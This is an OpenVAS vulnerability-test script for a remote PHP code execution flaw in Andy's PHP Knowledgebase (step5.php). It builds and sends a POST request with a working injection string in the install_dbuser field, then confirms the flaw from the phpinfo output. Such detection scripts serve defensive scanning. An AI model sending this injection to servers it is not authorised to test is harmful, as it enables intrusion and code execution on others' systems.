###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_aphpkb_code_exec_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Andy's PHP Knowledgebase 'step5.php' Remote PHP Code Execution Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow remote attackers to execute arbitrary PHP
  code within the context of the affected web server process.
  Impact Level: Application";
tag_affected = "Andy's PHP Knowledgebase version 0.95.5 and prior.";
tag_insight = "The flaw is caused by improper validation of user-supplied input passed
  via the 'install_dbuser' parameter to 'step5.php', that allows attackers
  to execute arbitrary PHP code.";
tag_solution = "No solution or patch is available as of 23rd May, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://aphpkb.sourceforge.net/";
tag_summary = "This host is running Andy's PHP Knowledgebase and is prone to
  remote PHP code execution vulnerability.";

if(description)
{
  script_id(902519);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-06-01 11:16:16 +0200 (Wed, 01 Jun 2011)");
  script_bugtraq_id(47918);
  script_tag(name:"cvss_base", value:"9.7");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_name("Andy's PHP Knowledgebase 'step5.php' Remote PHP Code Execution Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://downloads.securityfocus.com/vulnerabilities/exploits/47918.txt");

  script_description(desc);
  script_summary("Check if Andy's PHP Knowledgebase is prone to an code execution vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_aphpkb_detect.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!get_port_state(port)) {
  exit(0);
}

## Chek Host Supports PHP
if(!can_host_php(port:port)) {
  exit(0);
}

## Get Andy's PHP Knowledgebase Installed Location
if(!dir = get_dir_from_kb(port:port, app:"aphpkb")){
  exit(0);
}

## Not a safe check
if(!safe_checks())
{
  url = string(dir, "/install/step5.php");
  postData = "install_dbuser=');phpinfo();//&submit=Continue";

  ## Construct XSS post attack request
  req = string("POST ", url, " HTTP/1.1\r\n",
               "Host: ", get_host_name(), "\r\n",
               "User-Agent: OpenVAS\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(postData),
               "\r\n\r\n", postData);

  ## Send post request
  res = http_send_recv(port:port, data:req);

  ## Confirm exploit worked by checking the response
  if(http_vuln_check(port:port, url:url, pattern:'>phpinfo()<',
     extra_check: make_list('>System <', '>Configuration<', '>PHP Core<')))
  {
    security_hole(port);
    exit(0);
  }
}

if(vers = get_version_from_kb(port:port, app:"aphpkb"))
{
  if(version_is_less_equal(version:vers, test_version:"0.95.5")){
    security_hole(port:port);
  }
}
